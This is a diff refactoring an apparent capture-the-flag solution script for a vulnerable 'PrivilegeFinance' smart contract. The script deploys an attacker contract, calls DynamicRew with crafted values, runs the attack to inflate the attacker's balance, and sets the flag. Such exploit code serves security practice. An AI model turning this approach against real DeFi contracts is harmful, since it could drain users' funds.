@@ -1,10 +1,7 @@
 import chalk from "chalk";
 import { ethers } from "hardhat";
-import { PrivilegeFinance__factory, PrivilegeFinanceAttack__factory} from "../../typechain";
-
-function log(s:string){
-    console.log(`${chalk.green("[-] ")+s}`)
-}
+import { PrivilegeFinanceNumen23, PrivilegeFinanceNumen23__factory, PrivilegeFinanceNumen23Attack__factory} from "../../typechain";
+import { log, initialize } from "../utils";
 
 function help(): [string, number] {
     let msgsender = "0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0";
@@ -32,47 +29,26 @@ function help(): [string, number] {
 }
 
 async function main() {
-    const signers = await ethers.getSigners();
-    const provider = ethers.provider;
-    const network = await provider.getNetwork();
-    const deployer = signers[0];
-    const attacker = signers[2];
+    let [privilegeFinanceContract, attacker] = await initialize<PrivilegeFinanceNumen23>(PrivilegeFinanceNumen23__factory);
 
-    log(`Running on the ${chalk.yellow(network.name)} network`);
-    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
-    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);
-
-    let privilegeFinanceContract;
-    let tx;
-    if(network.name == "hardhat") {
-        privilegeFinanceContract = await new PrivilegeFinance__factory(deployer).deploy();
-        await privilegeFinanceContract.waitForDeployment();
-        privilegeFinanceContract = privilegeFinanceContract.connect(attacker);
-        log(`Successfully deployed the target contract to address ${chalk.yellow(await privilegeFinanceContract.getAddress())}!`)
-    } else if (network.name == "remote") {
-        const contractAddress = "0x0000000000000000000000000000000000000000";
-        privilegeFinanceContract = PrivilegeFinance__factory.connect(contractAddress, attacker);
-        log(`Successfully connected to the target contract with address ${chalk.yellow(await privilegeFinanceContract.getAddress())}!`)
-    }
     let [msgsender, blocktimestamp] = help();
 
-    if(privilegeFinanceContract) {
-        const privilegeFinanceAttack = await new PrivilegeFinanceAttack__factory(attacker).deploy();
-        await privilegeFinanceAttack.waitForDeployment();
+    const privilegeFinanceAttack = await new PrivilegeFinanceNumen23Attack__factory(attacker).deploy();
+    await privilegeFinanceAttack.waitForDeployment();
 
-        tx = await privilegeFinanceContract.DynamicRew(msgsender, blocktimestamp, 10000000, 50);
-        await tx.wait();
-        log(`ReferrerFees: ${chalk.yellow(await privilegeFinanceContract.ReferrerFees())}`);
-        
-        tx = await privilegeFinanceAttack.attack(await privilegeFinanceContract.getAddress());
-        await tx.wait();
-        log(`Attacker contract's referrer: ${chalk.yellow(await privilegeFinanceContract.referrers(await privilegeFinanceAttack.getAddress()))}`);
-        log(`Attacker balance: ${chalk.yellow(await privilegeFinanceContract.balances(attacker.address))}`);
+    let tx = await privilegeFinanceContract.DynamicRew(msgsender, blocktimestamp, 10000000, 50);
+    await tx.wait();
+    log(`ReferrerFees: ${chalk.yellow(await privilegeFinanceContract.ReferrerFees())}`);
+    
+    tx = await privilegeFinanceAttack.attack(await privilegeFinanceContract.getAddress());
+    await tx.wait();
+    log(`Attacker contract's referrer: ${chalk.yellow(await privilegeFinanceContract.referrers(await privilegeFinanceAttack.getAddress()))}`);
+    log(`Attacker balance: ${chalk.yellow(await privilegeFinanceContract.balances(attacker.address))}`);
 
-        tx = await privilegeFinanceContract.setflag();
-        await tx.wait();
-        log(`Is solved: ${chalk.yellow(await privilegeFinanceContract.isSolved())}`);
-    }
+    tx = await privilegeFinanceContract.setflag();
+    await tx.wait();
+    log(`Is solved: ${chalk.yellow(await privilegeFinanceContract.isSolved())}`);
+    
 }
 
 main().catch((error) => {
